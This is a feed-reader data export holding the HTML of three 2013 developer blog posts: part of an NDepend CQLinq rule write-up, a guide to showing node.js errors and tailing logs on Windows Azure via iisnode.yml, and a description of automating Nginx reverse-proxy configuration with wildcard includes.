classes, strings, delegates) </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC34\">// corrupted state might result in a NullReferenceException.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC35\">// If the field type is a value type (number, boolean, structure) </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC36\">// corrupted state might result in wrong result not even signaled by an exception sent.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC37\">//</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC38\">// There is no straight advice to refactor the number of methods responsible for assigning a field.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC39\">// Solutions often involve rethinking and then rewriting a complex algorithm.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC40\">// Such field can sometime become just a variable accessed locally by a method or a closure.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC41\">// Sometime, just rethinking the life-time and the role of the parent object allows the field to become immutable </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC42\">// (i.e assigned only by the constructor).</div></pre></td></tr></table></div></div><div class=\"gist-meta\"><a href=\"https://gist.github.com/anonymous/5569350/raw/93594f85f15058434f2e75c50da25ec8450f73c1/CQLinq%3A+Don%27t+assign+a+field+from+many+methods\" style=\"float:right\">view raw</a><a href=\"https://gist.github.com/anonymous/5569350#file-cqlinq-don-t-assign-a-field-from-many-methods\" style=\"float:right; margin-right:10px; color:#666;\">CQLinq: Don't assign a field from many methods</a><a href=\"https://gist.github.com/anonymous/5569350\">This Gist</a> brought to you by <a href=\"https://github.com\">GitHub</a>.</div></div></div></noscript><p>And here is what it looks like when we run the rules on the NUnit code base:</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/Screenshot1.png\"><img class=\"alignnone size-full wp-image-794\" alt=\"NDepend CQLinq Rules\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/Screenshot1.png\" width=\"576\" height=\"829\" /></a></p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/BOXC6YmI2J4\" height=\"1\" width=\"1\"/>","author":"Patrick Smacchia","_id":{"$wrap":"$oid","v":983}}
{"k":"0000000082","o":"0000006017","v":"001"}
{"_id":984,"_uid":984,"_dt":1373741607072,"_s":"188aa2fcc39ca4fa9d6c7e4c53589be6"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/383TA9m377E/","title":"Debugging node.js errors in Windows Azure","published":{"$wrap":"$date","v":1364787874000,"h":"2013-04-01T03:44:34.000Z"},"starred":false,"read":false,"content":"<p>A common problem you might encounter in Windows Azure is seeing a big old “The page cannot be displayed” page due to an error occurring in your azure-deployed node app.</p><p>If you haven’t seen it, it looks exactly like this:</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.21.37PM.png\"><img style=\"border-width: 0px\" title=\"Screen Shot 2013-03-31 at 8.21.37 PM\" alt=\"Screen Shot 2013-03-31 at 8.21.37 PM\" src=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.21.37PM_thumb.png\" width=\"457\" height=\"247\" border=\"0\" /></a></p><p>The reason this is happening is because by default we don’t allow errors to propagate back to the user. This is in order to prevent you publishing to production and leaking details of your system.</p><p>Let’s assume I just published a simple express app, but I made an error. Below you can see that instead of requiring winston, I required win$ton.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.29.21PM.png\"><img style=\"border-width: 0px\" title=\"Screen Shot 2013-03-31 at 8.29.21 PM\" alt=\"Screen Shot 2013-03-31 at 8.29.21 PM\" src=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.29.21PM_thumb.png\" width=\"455\" height=\"331\" border=\"0\" /></a></p><p>When I publish, I’ll see the page cannot be displayed error.</p><h2>iisnode.yml to the rescue</h2><p>To find out what is going on, you can enable displaying errors using our YAML configuration file otherwise known as iisnode.yml. If you use our azure-cli tool, and create a site in a directory where there is a node app, then we automatically create it for you. If not, you can create one really easy with any text editor. The entries you need to put in the file / update are below.</p><script src=\"http://gist.github.com/5283112.js\"></script><noscript><link rel=\"stylesheet\" href=\"https://gist.github.com/assets/embed-bfcadee384027982121fdeb9930e78b2.css\"><div id=\"gist5283112\" class=\"gist\"><div class=\"gist-file\"><div class=\"gist-data gist-syntax\"><div class=\"file-data\"><table cellpadding=\"0\" cellspacing=\"0\" class=\"lines highlight\"><tr><td class=\"line-numbers\"><span class=\"line-number\" id=\"file-iisnode-yml-L1\" rel=\"file-iisnode-yml-L1\">1</span><span class=\"line-number\" id=\"file-iisnode-yml-L2\" rel=\"file-iisnode-yml-L2\">2</span></td><td class=\"line-data\"><pre class=\"line-pre\"><div class=\"line\" id=\"file-iisnode-yml-LC1\"><span class=\"l-Scalar-Plain\">loggingEnabled</span><span class=\"p-Indicator\">:</span> <span class=\"l-Scalar-Plain\">true</span></div><div class=\"line\" id=\"file-iisnode-yml-LC2\"><span class=\"l-Scalar-Plain\">devErrorsEnabled</span><span class=\"p-Indicator\">:</span> <span class=\"l-Scalar-Plain\">true</span></div></pre></td></tr></table></div></div><div class=\"gist-meta\"><a href=\"https://gist.github.com/glennblock/5283112/raw/1b7938b40c9d679718da274c25a3f240b4ea78ed/iisnode.yml\" style=\"float:right\">view raw</a><a href=\"https://gist.github.com/glennblock/5283112#file-iisnode-yml\" style=\"float:right; margin-right:10px; color:#666;\">iisnode.yml</a><a href=\"https://gist.github.com/glennblock/5283112\">This Gist</a> brought to you by <a href=\"https://github.com\">GitHub</a>.</div></div></div></noscript><p>Once you save that file, go republish to Windows Azure. If the file did not exist and this is an Azure Website, do an “azure site restart”. if the file already existed, you won’t need to do anything.</p><p>Now with debugger errors enabled I see the following:</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.34.14PM.png\"><img style=\"border-width: 0px\" title=\"Screen Shot 2013-03-31 at 8.34.14 PM\" alt=\"Screen Shot 2013-03-31 at 8.34.14 PM\" src=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.34.14PM_thumb.png\" width=\"468\" height=\"253\" border=\"0\" /></a></p><p><strong>Bingo!</strong></p><h2></h2><h2>Don’t go to production this way, but DO use tail for websites.</h2><p>Make sure to disable debugger errors when you go to production. You can leave logging enabled however, because another command you can still use is “azure site log tail” which will stream logs directly to your console realtime. Also if you are a cloud service, you can remote in to view the logs written locally.</p><p>Using “azure site log tail” watch what happens when I refresh the page.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.37.58PM.png\"><img style=\"border-width: 0px\" title=\"Screen Shot 2013-03-31 at 8.37.58 PM\" alt=\"Screen Shot 2013-03-31 at 8.37.58 PM\" src=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.37.58PM_thumb.png\" width=\"484\" height=\"230\" border=\"0\" /></a></p><p>azure-log tail has many more uses. You can use it to capture any log output that your applications give you in a realtime manner. For example here’s a screenshot of me tailing an app using socket.io and Service Bus in Azure.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.40.42PM.png\"><img style=\"border-width: 0px\" title=\"Screen Shot 2013-03-31 at 8.40.42 PM\" alt=\"Screen Shot 2013-03-31 at 8.40.42 PM\" src=\"http://codebetter.com/glennblock/files/2013/04/ScreenShot20130331at8.40.42PM_thumb.png\" width=\"488\" height=\"256\" border=\"0\" /></a></p><p>Yes it is awesome!</p><p>PS: Today “tail” works only for node apps, but that is going to change VERY shortly.</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/383TA9m377E\" height=\"1\" width=\"1\"/>","author":"Glenn Block","_id":{"$wrap":"$oid","v":984}}
{"k":"0000000082","o":"0000025789","v":"001"}
{"_id":985,"_uid":985,"_dt":1373741607073,"_s":"e53be00570d1706b4add0d2061af6fd2"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/ci_X3j_P5ns/automating-nginx-reverse-proxy.html","title":"Automating Nginx Reverse Proxy Configuration","published":{"$wrap":"$date","v":1371481200000,"h":"2013-06-17T15:00:00.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://lh3.ggpht.com/-RLmv0zNF1pY/Ub8kktUBTII/AAAAAAAAJ9Q/3TJfQbpYMR8/s1600-h/proxyautomation%25255B4%25255D.png\"><img title=\"proxyautomation\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"proxyautomation\" src=\"http://lh3.ggpht.com/-WWuegShsN_c/Ub8klUwm29I/AAAAAAAAJ9Y/dgFnBjfjvho/proxyautomation_thumb%25255B2%25255D.png?imgmax=800\" width=\"640\" height=\"479\" /></a></p><p>It’s really nice if you can decouple your external API from the details of application segregation and deployment.</p><p>In a previous post I explained<a href=\"http://mikehadlow.blogspot.co.uk/2013/05/the-benefits-of-reverse-proxy.html\">some of the benefits of using a reverse proxy</a>. On my current project we’ve building a distributed service oriented architecture that also exposes an HTTP API, and we’re using a reverse proxy to route requests addressed to our API to individual components. We have chosen the excellent<a href=\"http://wiki.nginx.org/Main\">Nginx</a>web server to serve as our reverse proxy; it’s fast, reliable and easy to configure. We use it to aggregate multiple services exposing HTTP APIs into a single URL space. So, for example, when you type:</p><p><a href=\"http://api.example.com/product/pinstripe_suit\">http://api.example.com/product/pinstripe_suit</a></p><p>It gets routed to:</p><p><a href=\"http://10.0.1.101:8001/product/pinstripe_suit\">http://10.0.1.101:8001/product/pinstripe_suit</a></p><p>But when you go to:</p><p><a href=\"http://api.example.com/customer/103474783\">http://api.example.com/customer/103474783</a></p><p>It gets routed to</p><p><a href=\"http://10.0.1.104:8003/customer/103474783\">http://10.0.1.104:8003/customer/103474783</a></p><p>To the consumer of the API it appears that they are exploring a single URL space (<a href=\"http://api.example.com/blah/blah\">http://api.example.com/blah/blah</a>), but behind the scenes the different top level segments of the URL route to different back end servers. /product/… routes to 10.0.1.101:8001, but /customer/… routes to 10.0.1.104:8003.</p><p>We also want this to be self-configuring. So, say I want to create a new component of the system that records stock levels. Rather than extending an existing component, I want to be able to write a stand-alone executable or service that exposes an HTTP endpoint, have it be automatically deployed to one of the hosts in my cloud infrastructure, and have Nginx automatically route requests addressed<a href=\"http://api.example.com/stock/whatever\">http://api.example.com/stock/whatever</a>to my new component.</p><p>We also want to load balance these back end services. We might want to deploy several instances of our new stock API and have Nginx automatically round robin between them.</p><p>We call each top level segment ( /stock, /product, /customer ) a<em>claim.</em>A component publishes an ‘AddApiClaim’ message over RabbitMQ when it comes on line. This message has 3 fields: ‘Claim', ‘ipAddress’, and ‘PortNumber’. We have a special component, ProxyAutomation, that subscribes to these messages and rewrites the Nginx configuration as required. It uses SSH and SCP to log into the Nginx server, transfer the various configuration files, and instruct Nginx to reload its configuration. We use<a href=\"http://mikehadlow.blogspot.co.uk/2013/05/sshnet.html\">the excellent SSH.NET</a>library to automate this.</p><p>A really nice thing about Nginx configuration is wildcard includes. Take a look at our top level configuration file:</p><div id=\"codeSnippetWrapper\"><div id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum1\" style=\"color: #606060\">1:</span>...</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum2\" style=\"color: #606060\">2:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum3\" style=\"color: #606060\">3:</span>http {</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum4\" style=\"color: #606060\">4:</span>include       /etc/nginx/mime.types;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum5\" style=\"color: #606060\">5:</span>default_type  application/octet-stream;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum6\" style=\"color: #606060\">6:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum7\" style=\"color: #606060\">7:</span>log_format  main<span style=\"color: #006080\">'$remote_addr - $remote_user [$time_local]\"$request\" '</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum8\" style=\"color: #606060\">8:</span><span style=\"color: #006080\">'$status $body_bytes_sent\"$http_referer\" '</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum9\" style=\"color: #606060\">9:</span><span style=\"color: #006080\">'\"$http_user_agent\"\"$http_x_forwarded_for\"'</span>;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum10\" style=\"color: #606060\">10:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum11\" style=\"color: #606060\">11:</span>access_log  /var/log/nginx/access.log  main;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum12\" style=\"color: #606060\">12:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum13\" style=\"color: #606060\">13:</span>sendfile        on;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum14\" style=\"color: #606060\">14:</span>keepalive_timeout  65;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum15\" style=\"color: #606060\">15:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum16\" style=\"color: #606060\">16:</span>include /etc/nginx/conf.d/*.conf;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum17\" style=\"color: #606060\">17:</span>}</pre><!--CRLF--></div></div><p>Line 16 says, take any *.conf file in the conf.d directory and add it here.</p><p>Inside conf.d is a single file for all api.example.com requests:</p><div id=\"codeSnippetWrapper\"><div id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum1\" style=\"color: #606060\">1:</span>include     /etc/nginx/conf.d/api.example.com.conf.d/upstream.*.conf;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum2\" style=\"color: #606060\">2:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum3\" style=\"color: #606060\">3:</span>server {</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum4\" style=\"color: #606060\">4:</span>listen          80;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum5\" style=\"color: #606060\">5:</span>server_name     api.example.com;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum6\" style=\"color: #606060\">6:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum7\" style=\"color: #606060\">7:</span>include         /etc/nginx/conf.d/api.example.com.conf.d/location.*.conf;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum8\" style=\"color: #606060\">8:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum9\" style=\"color: #606060\">9:</span>location / {</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum10\" style=\"color: #606060\">10:</span>root    /usr/share/nginx/api.example.com;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum11\" style=\"color: #606060\">11:</span>index   index.html index.htm;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum12\" style=\"color: #606060\">12:</span>}</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum13\" style=\"color: #606060\">13:</span>}</pre><!--CRLF--></div></div><p>This is basically saying listen on port 80 for any requests with a host header ‘api.example.com’.</p><p>This has two includes. The first one at line 1, I’ll talk about later. At line 7 it says ‘take any file named location.*.conf in the subdirectory ‘api.example.com.conf.d’ and add it to the configuration. Our proxy automation component adds new components (AKA API claims) by dropping new location.*.conf files in this directory. For example, for our stock component it might create a file, ‘location.stock.conf’, like this:</p><div id=\"codeSnippetWrapper\"><div id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum1\" style=\"color: #606060\">1:</span>location /stock/ {</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum2\" style=\"color: #606060\">2:</span>proxy_pass http:<span style=\"color: #008000\">//stock;</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum3\" style=\"color: #606060\">3:</span>}</pre><!--CRLF--></div></div><p></p><p></p><p>This simply tells Nginx to proxy all requests addressed to api.example.com/stock/… to the upstream servers defined at ‘stock’. This is where the other include mentioned above comes in, ‘upstream.*.conf’. The proxy automation component also drops in a file named upstream.stock.conf that looks something like this:</p><div id=\"codeSnippetWrapper\"><div id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum1\" style=\"color: #606060\">1:</span>upstream stock {</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum2\" style=\"color: #606060\">2:</span>server 10.0.0.23:8001;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum3\" style=\"color: #606060\">3:</span>server 10.0.0.23:8002;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum4\" style=\"color: #606060\">4:</span>}</pre><!--CRLF--></div></div><p>This tells Nginx to round-robin all requests to api.example.com/stock/ to the given sockets. In this example it’s two components on the same machine (10.0.0.23), one on port 8001 and the other on port 8002.</p><p>As instances of the stock component get deployed, new entries are added to upstream.stock.conf. Similarly, when components get uninstalled, the entry is removed. When the last entry is removed, the whole file is also deleted.</p><p>This infrastructure allows us to decouple infrastructure configuration from component deployment. We can scale the application up and down by simply adding new component instances as required. As a component developer, I don’t need to do any proxy configuration, just make sure my component publishes add and remove API claim messages and I’m good to go.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":985}}
{"k":"0000000082","o":"0000003102","v":"001"}
